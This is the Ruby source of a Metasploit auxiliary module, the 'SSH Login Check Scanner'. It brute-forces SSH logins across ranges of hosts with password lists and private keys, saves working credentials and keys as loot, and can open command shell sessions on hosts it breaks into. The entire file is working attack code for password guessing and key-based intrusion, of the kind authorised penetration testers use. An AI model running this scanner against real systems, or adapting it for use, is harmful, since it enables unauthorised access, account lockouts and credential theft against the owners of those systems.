##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/ssh'
require 'net/ssh/command_stream'
require 'metasploit/framework/login_scanner/ssh'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/key_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::CommandShell
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::SSH
  include Msf::Sessions::CreateSessionOptions
  include Msf::Auxiliary::ReportSummary
  include Msf::Exploit::Deprecated
  moved_from 'auxiliary/scanner/ssh/ssh_login_pubkey'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SSH Login Check Scanner',
        'Description' => %q{
          This module tests SSH logins on a range of machines using passwords
          and/or private keys. Successful logins are recorded in the database
          as credentials, along with host and platform information.
        },
        'Author' => [
          'todb',
          'RageLtMan',
          'g0tmi1k' # @g0tmi1k - additional features
        ],
        'AKA' => ['ssh_login_pubkey'],
        'References' => [
          [ 'CVE', '1999-0502' ], # Weak password
          [ 'ATT&CK', Mitre::Attack::Technique::T1021_004_SSH ],
          [ 'ATT&CK', Mitre::Attack::Technique::T1110_001_PASSWORD_GUESSING ]
        ],
        'License' => MSF_LICENSE,
        'DefaultOptions' => { 'VERBOSE' => false }, # Disable annoying connect errors
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ACCOUNT_LOCKOUTS]
        }
      )
    )

    register_options(
      [
        OptPath.new('KEY_PATH', [false, 'Filename or directory of cleartext private keys. Filenames beginning with a dot, or ending in ".pub" will be skipped. Duplicate private keys will be ignored.']),
        OptString.new('KEY_PASS', [false, 'Passphrase for SSH private key(s)']),
        OptString.new('PRIVATE_KEY', [false, 'The string value of the private key that will be used. If you are using MSFConsole, this value should be set as file:PRIVATE_KEY_PATH. OpenSSH, RSA, DSA, and ECDSA private keys are supported.'])
      ], self.class
    )

    register_advanced_options(
      [
        Opt::Proxies,
        OptBool.new('GatherProof', [true, 'Gather proof of access via pre-session shell commands', true])
      ]
    )
  end

  def session_setup(result, scanner, used_key: false)
    return unless scanner.ssh_socket

    platform = scanner.get_platform(result.proof)

    # Create a new session
    sess = Msf::Sessions::SshCommandShellBind.new(scanner.ssh_socket)

    auth_type_options = if used_key
                          {
                            'PASSWORD' => nil
                          }
                        else
                          {
                            'PASSWORD' => result.credential.private,
                            'PRIVATE_KEY' => nil,
                            'KEY_FILE' => nil
                          }
                        end

    merge_me = {
      'USERPASS_FILE' => nil,
      'USER_FILE' => nil,
      'PASS_FILE' => nil,
      'USERNAME' => result.credential.public
    }.merge(auth_type_options)

    s = start_session(self, nil, merge_me, false, sess.rstream, sess)
    sockets.delete(scanner.ssh_socket.transport.socket)

    # Set the session platform
    s.platform = platform

    # Create database host information
    host_info = { host: scanner.host }

    host_info[:os_name] = s.platform.capitalize unless s.platform == 'unknown'

    report_host(host_info)

    s
  rescue StandardError => e
    elog('Failed to setup the session', error: e)
    print_brute level: :error, ip: scanner.host, msg: "Failed to setup the session - #{e.class} #{e.message}"
  end

  def run_scanner(ip, scanner)
    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )

      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        report_ssh_proof(ip, result)

        banner = scanner.ssh_socket.transport.server_version.version
        report_ssh_service(ip, info: banner)
        report_ssh_host(banner, ip, rport)

        yield result, credential_data

        warn_unknown_platform(ip, scanner, result)
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        vprint_brute level: :verror, ip: ip, msg: "Could not connect: #{result.proof}"

        report_ssh_service(ip, info: @banner) if @banner && !result.proof.to_s.empty?

        invalidate_login(credential_data)

        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?

        :abort
      else
        report_ssh_banner(scanner, ip) if result.status == Metasploit::Model::Login::Status::INCORRECT

        handle_login_failure(ip, scanner, result, credential_data)
      end
    end
  end

  def run_host(ip)
    @reported_service = false
    @banner = grab_ssh_banner(ip)
    print_brute ip: ip, msg: 'Starting SSH login sweep'

    if datastore['USERNAME'].blank? && datastore['USER_FILE'].blank? && datastore['USERPASS_FILE'].blank? && !datastore['ANONYMOUS_LOGIN']
      print_brute level: :error, ip: ip, msg: 'No credentials specified. Set USERNAME/PASSWORD, USER_FILE/PASS_FILE/USERPASS_FILE, or ANONYMOUS_LOGIN.'
      return
    end

    unless attempt_password_login? || attempt_pubkey_login?
      validation_reason = 'At least one of KEY_PATH, PRIVATE_KEY or PASSWORD must be given'
      raise Msf::OptionValidateError.new(
        {
          'KEY_PATH' => validation_reason,
          'PRIVATE_KEY' => validation_reason,
          'PASSWORD' => validation_reason
        }
      )
    end

    do_login_creds(ip) if attempt_password_login?
    do_login_pubkey(ip) if attempt_pubkey_login?
  end

  def do_login_creds(ip)
    print_brute ip: ip, msg: 'SSH - Testing user/pass combinations'

    cred_collection = build_credential_collection(
      username: datastore['USERNAME'],
      password: datastore['PASSWORD']
    )

    scanner = Metasploit::Framework::LoginScanner::SSH.new(
      configure_login_scanner(
        host: ip,
        port: rport,
        cred_details: cred_collection,
        proxies: datastore['Proxies'],
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: datastore['SSH_TIMEOUT'],
        framework: framework,
        framework_module: self,
        skip_gather_proof: !datastore['GatherProof']
      )
    )

    scanner.verbosity = :debug if datastore['SSH_DEBUG']

    run_scanner(ip, scanner) do |result, credential_data|
      credential_data[:private_type] = :password
      credential_core = create_credential(credential_data)
      credential_data[:core] = credential_core
      create_credential_login(credential_data)

      session_setup(result, scanner, used_key: false) if datastore['CreateSession']
    end
  end

  def do_login_pubkey(ip)
    print_brute ip: ip, msg: 'SSH - Testing key combinations'

    keys = Metasploit::Framework::KeyCollection.new(
      key_path: datastore['KEY_PATH'],
      password: datastore['KEY_PASS'],
      user_file: datastore['USER_FILE'],
      username: datastore['USERNAME'],
      private_key: datastore['PRIVATE_KEY']
    )

    unless keys.valid?
      print_brute level: :error, ip: ip, msg: 'Failed to read key files:'
      keys.error_list.each do |err|
        print_brute level: :error, ip: ip, msg: "  - #{err}"
      end
    end

    keys = prepend_db_keys(keys)

    key_count = keys.key_data.count
    key_sources = []
    key_sources.append(datastore['KEY_PATH']) unless datastore['KEY_PATH'].blank?
    key_sources.append('PRIVATE_KEY') unless datastore['PRIVATE_KEY'].blank?
    key_sources.append('database') if prepend_db_creds?

    print_brute level: :vstatus, ip: ip, msg: "Testing #{key_count} #{'key'.pluralize(key_count)} from #{key_sources.join(' and ')}"

    scanner = Metasploit::Framework::LoginScanner::SSH.new(
      configure_login_scanner(
        host: ip,
        port: rport,
        cred_details: keys,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        proxies: datastore['Proxies'],
        connection_timeout: datastore['SSH_TIMEOUT'],
        framework: framework,
        framework_module: self,
        skip_gather_proof: !datastore['GatherProof']
      )
    )

    scanner.verbosity = :debug if datastore['SSH_DEBUG']

    run_scanner(ip, scanner) do |result, credential_data|
      begin
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)
      rescue ::StandardError => e
        print_brute level: :info, ip: ip, msg: "Failed to create credential - #{e.class}: #{e}"
        print_brute level: :warn, ip: ip, msg: 'We do not currently support storing password protected SSH keys: https://github.com/rapid7/metasploit-framework/issues/20598'
      end

      store_ssh_key_loot(ip, result.credential.public, result.credential.private)

      session_setup(result, scanner, used_key: true) if datastore['CreateSession']
    end
  end

  def warn_unknown_platform(ip, scanner, result)
    return unless datastore['GatherProof'] && scanner.get_platform(result.proof) == 'unknown'

    print_brute level: :error, ip: ip, msg: "While a session may have opened, it may be bugged. If you experience issues with it, re-run this module with 'set gatherproof false'."
    print_brute level: :error, ip: ip, msg: 'Also consider submitting an issue at github.com/rapid7/metasploit-framework with device details so it can be handled in the future.'
  end

  def handle_login_failure(ip, scanner, result, credential_data)
    cred = result.credential
    cred_display = cred.public.to_s.empty? ? '<anonymous>' : cred.to_s
    proof = result.proof.to_s.strip
    proof_str = if cred.public.to_s.empty?
                  result.status.to_s
                elsif proof.empty?
                  result.status.to_s
                else
                  "#{result.status}: #{proof}"
                end
    vprint_brute level: :verror, ip: ip, msg: "Failed: '#{cred_display}' (#{proof_str})"

    invalidate_login(credential_data)

    scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
  end

  def report_ssh_banner(scanner, ip)
    unless @reported_service
      banner = @banner || scanner.ssh_socket&.transport&.server_version&.version
      report_ssh_service(ip, info: banner)
      report_ssh_host(banner, ip, rport)
      @reported_service = true
    end
  end

  def report_ssh_proof(ip, result)
    id_part, uname_part = result.proof.to_s.split("\n", 2)

    cred = result.credential
    if cred.private_type == :ssh_key
      private_display = begin
        key = Net::SSH::KeyFactory.load_data_private_key(cred.private, nil, false)
        key.fingerprint('SHA256')
      rescue StandardError
        '<ssh_key>'
      end
      cred_str = "#{cred.public}:#{private_display}"
    else
      cred_str = cred.to_s
    end

    msg = "Success: '#{cred_str}'"
    msg += " '#{id_part.strip}'" unless id_part.to_s.strip.empty?
    print_brute level: :good, ip: ip, msg: msg
    print_brute level: :vgood, ip: ip, msg: uname_part.strip if uname_part
    return unless result.proof.present?

    report_vuln(
      host: ip,
      port: rport,
      proto: 'tcp',
      sname: 'ssh',
      name: 'SSH Weak Credentials',
      info: "Successful login as '#{result.credential.public}'",
      refs: references
    )

    report_note(
      host: ip,
      port: rport,
      proto: 'tcp',
      sname: 'ssh',
      type: 'ssh.proof',
      data: {
        credential: cred_str,
        id: id_part.to_s.strip,
        uname: uname_part.to_s.strip
      },
      update: :unique_data
    )
  end

  def store_ssh_key_loot(ip, user, private_key_data)
    return unless framework.db.active
    return if private_key_data.to_s.empty?

    begin
      key = Net::SSH::KeyFactory.load_data_private_key(private_key_data, nil, false)
    rescue StandardError
      return
    end

    ktype = key.ssh_type.delete_prefix('ssh-').sub(/\Aecdsa-sha2-\S+/, 'ecdsa')
    key_fingerprint = key.fingerprint('SHA256')
    safe_username = user.gsub(/[^A-Za-z0-9]/, '_')
    ltype = "host.unix.ssh.#{safe_username}_#{ktype}_private"

    existing = framework.db.loots(workspace: myworkspace).where(ltype: ltype).select { |l| l.info == key_fingerprint }.first
    return existing.path if existing

    store_loot(
      ltype,
      'application/octet-stream',
      ip,
      (private_key_data + "\n"),
      "#{safe_username}_#{ktype}.private",
      key_fingerprint
    )
  end

  def attempt_pubkey_login?
    datastore['KEY_PATH'].present? ||
      datastore['PRIVATE_KEY'].present?
  end

  def attempt_password_login?
    datastore['PASSWORD'].present? ||
      datastore['PASS_FILE'].present? ||
      datastore['USERPASS_FILE'].present? ||
      datastore['BLANK_PASSWORDS'] ||
      datastore['USER_AS_PASS'] ||
      datastore['ANONYMOUS_LOGIN']
  end
end
